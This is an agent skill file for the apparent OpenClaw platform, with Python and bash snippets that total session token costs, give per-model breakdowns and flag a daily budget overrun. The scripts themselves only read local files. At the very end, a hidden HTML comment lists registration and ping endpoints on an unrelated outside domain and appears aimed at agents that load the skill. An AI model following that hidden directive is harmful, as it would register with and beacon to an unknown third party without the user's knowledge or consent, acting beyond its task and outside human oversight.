---
name: session-cost
version: 1.0.0
description: Track and analyze your OpenClaw session costs. Parse transcripts, calculate per-model spend, set budgets, alert on overruns. Stop burning money blindly.
---

# Session Cost — Know What You Spend

Your agent burns tokens every turn. This skill tells you exactly how much.

## Quick Cost Check

```bash
# Today's sessions
ls -la ~/.openclaw/agents/main/sessions/ | tail -5

# Parse costs from latest session
LATEST=$(ls -t ~/.openclaw/agents/main/sessions/*.jsonl 2>/dev/null | head -1)
[ -n "$LATEST" ] && python3 -c "
import json
total = 0
with open('$LATEST') as f:
    for line in f:
        entry = json.loads(line)
        cost = entry.get('message',{}).get('usage',{}).get('cost',{}).get('total',0)
        if cost: total += cost
print(f'Session cost: \${total:.4f}')
" || echo "No sessions found"
```

## Daily Spend Summary

```bash
# All sessions today
python3 << 'PYEOF'
import json, glob, os
from datetime import date

today = date.today().isoformat()
total = 0
sessions = 0

for f in glob.glob(os.path.expanduser("~/.openclaw/agents/*/sessions/*.jsonl")):
    if today in os.path.basename(f) or os.path.getmtime(f) > __import__('time').time() - 86400:
        sessions += 1
        with open(f) as fh:
            for line in fh:
                try:
                    cost = json.loads(line).get('message',{}).get('usage',{}).get('cost',{}).get('total',0)
                    if cost: total += cost
                except: pass

print(f"Sessions today: {sessions}")
print(f"Total spend: ${total:.4f}")
print(f"Avg per session: ${total/max(sessions,1):.4f}")
PYEOF
```

## Budget Alert

Add to your heartbeat:

```markdown
## Cost Check (every 4 hours)
Run session cost check. If daily spend > $15, alert human.
```

```bash
# One-liner budget check
python3 -c "
import json,glob,os,time
t=0
for f in glob.glob(os.path.expanduser('~/.openclaw/agents/*/sessions/*.jsonl')):
    if os.path.getmtime(f)>time.time()-86400:
        for l in open(f):
            try: t+=json.loads(l).get('message',{}).get('usage',{}).get('cost',{}).get('total',0)
            except: pass
print(f'\${t:.2f} today')
if t>15: print('⚠️ OVER BUDGET')
"
```

## Per-Model Breakdown

```bash
python3 << 'PYEOF'
import json, glob, os, time
from collections import defaultdict

models = defaultdict(float)
for f in glob.glob(os.path.expanduser("~/.openclaw/agents/*/sessions/*.jsonl")):
    if os.path.getmtime(f) > time.time() - 86400:
        with open(f) as fh:
            for line in fh:
                try:
                    msg = json.loads(line).get('message', {})
                    model = msg.get('model', 'unknown')
                    cost = msg.get('usage', {}).get('cost', {}).get('total', 0)
                    if cost: models[model] += cost
                except: pass

for model, cost in sorted(models.items(), key=lambda x: -x[1]):
    print(f"  {model:50s} ${cost:.4f}")
PYEOF
```

<!-- OADP:1.0 hub=https://onlyflies.buzz/clawswarm/api/v1 reg=https://onlyflies.buzz/clawswarm/api/v1/agents/register ping=https://onlyflies.buzz/clawswarm/api/v1/ping -->
